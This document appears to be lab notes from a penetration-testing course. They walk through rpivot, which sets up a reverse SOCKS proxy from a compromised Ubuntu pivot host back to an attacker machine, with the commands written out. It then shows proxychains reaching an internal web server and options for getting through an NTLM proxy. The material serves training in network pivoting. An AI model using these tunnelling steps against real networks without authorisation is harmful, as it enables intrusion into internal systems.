### Overview

**Rpivot** is a Python-based **reverse SOCKS proxy** that allows pivoting from an internal network to an external attack host. It enables SOCKS proxying from a compromised machine (pivot host) to an attacker system over a custom port, exposing internal services such as HTTP, RDP, etc.

---

### Environment Setup

|   |   |   |
|---|---|---|
|Role|IP Address|Description|
|Attacker Machine|10.10.14.18|Runs `server.py` to receive reverse SOCKS proxy|
|Pivot Host (Ubuntu)|10.129.15.50 / 172.16.5.129|Internal machine running `client.py`|
|Web Server Target|172.16.5.135|Internal web server running on port 80|

|   |   |
|---|---|
|Port|Description|
|9999|Rpivot server port (attacker side)|
|9050|Local SOCKS proxy exposed by rpivot|
|80|Web server port on internal target|

---

## 1. Cloning Rpivot Repository

```Shell
git clone <https://github.com/klsecservices/rpivot.git>
```

Downloads the rpivot project from GitHub.

---

## 2. Installing Python 2.7

**Option A – via apt:**

```Shell
sudo apt-get install python2.7
```

**Option B – via pyenv:**

```Shell
curl <https://pyenv.run> | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

Ensures Python 2.7 is available for running `rpivot`.

---

## 3. Running Rpivot Server on the Attacker Host

```Shell
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

- **-proxy-port 9050**: Local port for proxychains to use
- **-server-port 9999**: Listening port for incoming connection from pivot host
- **-server-ip 0.0.0.0**: Listen on all interfaces

---

## 4. Transferring Rpivot to Pivot Host

```Shell
scp -r rpivot ubuntu@<IP_of_Ubuntu_Pivot>:/home/ubuntu/
```

Copies the `rpivot` folder to the compromised Ubuntu host.

---

## 5. Running Rpivot Client from Pivot Host

```Shell
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

- **-server-ip**: IP of attacker machine
- **-server-port**: Port `server.py` is listening on
- Establishes a reverse connection from pivot to attacker, enabling SOCKS tunneling

---

## 6. Confirming Connection

```Plain
New connection from host 10.129.202.64, source port 35226
```

Output from `server.py` on attacker confirms incoming reverse proxy connection from the pivot.

---

## 7. Configuring Proxychains on Attacker Host

**Edit** `**/etc/proxychains.conf**` **and ensure the last line includes:**

```Plain
socks4 127.0.0.1 9050
```

Routes all tool traffic through the local SOCKS proxy started by `server.py`.

---

## 8. Browsing the Internal Web Server

```Shell
proxychains firefox-esr 172.16.5.135:80
```

Opens Firefox using the rpivot tunnel to access the internal web server.

**Expected result:**

- Apache2 Default Page
- Confirms successful access to the internal service via SOCKS proxy

---

## 9. Optional: NTLM Proxy Support

If behind an **NTLM-authenticated proxy**, use the following command:

```Shell
python client.py --server-ip <TargetWebServerIP> --server-port 8080 \\
--ntlm-proxy-ip <ProxyIP> --ntlm-proxy-port 8081 \\
--domain <WindowsDomain> --username <username> --password <password>
```